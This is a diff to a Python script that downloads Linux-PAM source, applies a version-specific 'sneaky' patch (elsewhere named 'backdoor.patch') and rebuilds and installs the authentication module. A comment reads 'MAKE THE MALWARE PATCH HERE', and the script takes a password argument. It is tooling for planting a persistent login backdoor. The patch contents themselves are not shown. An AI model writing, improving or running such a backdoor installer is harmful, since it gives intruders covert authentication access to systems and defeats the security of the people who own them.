@@ -6,6 +6,13 @@ import subprocess
 import tarfile
 from pathlib import Path
 
+PATCHES = {
+    "1.7.0": "sneaky-1.7.0.patch",
+    "1.6.0": "sneaky-1.6.0.patch",
+    "1.5.0": "sneaky-1.5.0.patch",
+}
+
+
 # PAM_BASE_URL = f"https://github.com/linux-pam/linux-pam/releases/download/v{version}"
 
 #how to run
@@ -72,9 +79,14 @@ def extract_tarball(pam_file):
     with tarfile.open(pam_file, "r:*") as tar:
         tar.extractall()
 # applies a patch that changes the PAM file, then configures, compiles, and installs the new changes to take effect
-def build_pam(pam_dir: str):
+def build_pam(pam_dir: str, patch_file: str):
     script_dir = Path(__file__).parent
-    patch_path = script_dir / "sneaky.patch"
+    patch_path = Path(__file__).parent / patch_file
+    subprocess.run(
+    ["patch", "-p1", "-d", pam_dir],
+    input=patch_path.read_bytes(),
+)
+
     pam_path = Path(pam_dir)
     
     # if not pam_path.exists():
@@ -92,10 +104,10 @@ def build_pam(pam_dir: str):
     # print("[+] Running make")
     # run_cmd(["make"], cwd=str(pam_path))
 
-    subprocess.run(
-        #["patch", "-p1", "-d", pam_dir], input=open("backdoor.patch", "rb").read(),
-        ["patch", "-p1", "-d", pam_dir], input=patch_path.read_bytes(),
-    )
+    # subprocess.run(
+    #     #["patch", "-p1", "-d", pam_dir], input=open("backdoor.patch", "rb").read(),
+    #     ["patch", "-p1", "-d", pam_dir], input=patch_path.read_bytes(),
+    # )
     
     print("[+] Setting up meson")
     run_cmd(["meson", "setup", "build"], cwd=str(pam_path))
@@ -123,16 +135,20 @@ def main():
 
         # If user-supplied version mismatches system version, override
         if args.version.strip() != system_ver:
-            print(f"[!] WARNING: You requested PAM {args.version}, "
-                  f"but the system uses {system_ver}.")
-            print("[!] Using system version instead to avoid ABI mismatch.")
+            print(f"[!] WARNING: You requested PAM {args.version}, "f"but the system uses {system_ver}.")
+            print("[!] Using system version to avoid ABI mismatch.")
             version = system_ver
         else:
             version = args.version.strip()
     else:
-        print("[!] Could not detect system PAM version. Using user-supplied version.")
+        print("[!] Could not detect system PAM version. Using user-supplied version. Good luck, you're prob breaking something.")
         version = args.version.strip()
-    
+    if version in PATCHES:
+        patch_file = PATCHES[version]
+    else:
+        print(f"[!] No patch availible for PAM {version} exiting")
+        return
+        
     version = args.version.strip()
     password = args.password
     # args, unknown = parser.parse_known_args()
@@ -163,7 +179,7 @@ def main():
     # unpacks downloaded source archive
     extract_tarball(pam_file)
     # runs the build process on the extracted source (MAKE THE MALWARE PATCH HERE)
-    build_pam(pam_dir)
+    build_pam(pam_dir, patch_file)
 
 if __name__ == "__main__":
     main()
